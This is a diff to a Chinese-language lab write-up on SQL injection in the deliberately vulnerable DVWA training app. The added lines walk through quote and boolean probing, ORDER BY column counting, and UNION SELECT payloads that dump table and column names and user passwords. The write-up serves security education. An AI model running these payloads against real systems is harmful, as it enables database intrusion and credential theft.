@@ -82,12 +82,33 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 
 ## 1.2 攻击
-`1' OR '1' = '1`
-`SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';`
-永远为真，查询所有用户数据
-![](images/1.png)
-输入`1'`，报错如下图
+### 1.2.1 探测
+判断注入点，以及字符型or数字型：
+
+- 单引号测试：`1'`，返回sql错误，说明代码没有对特殊字符进行转义
 ![](images/2.png)
+
+- 逻辑测试：`1' AND '1'='1`（正常显示），`1' AND '1'='2`（无数据）。为字符型注入
+![](images/1.png)
+
+### 1.2.2 信息收集
+摸清数据库结构：
+
+- 确定列数：`1' ORDER BY 2 #`（页面正常），`1' ORDER BY 3 #`（页面报错，仅两列）
+![](images/3.png)
+
+- 确定显示位：`1' UNION SELECT 1, 2 #`
+![](images/4.png)
+
+### 1.2.3 脱库
+- 数据库名和版本：`1' UNION SELECT version(), database() #`
+![](images/5.png)
+- 获取表名：`1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema='dvwa' #`
+![](images/6.png)
+- 获取列名：`1' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users' #`
+![](images/7.png)
+- 获取账户密码：`1' UNION SELECT user, password FROM users #`
+![](images/8.png)
 
 # 二、Medium
 ## 2.1 源码
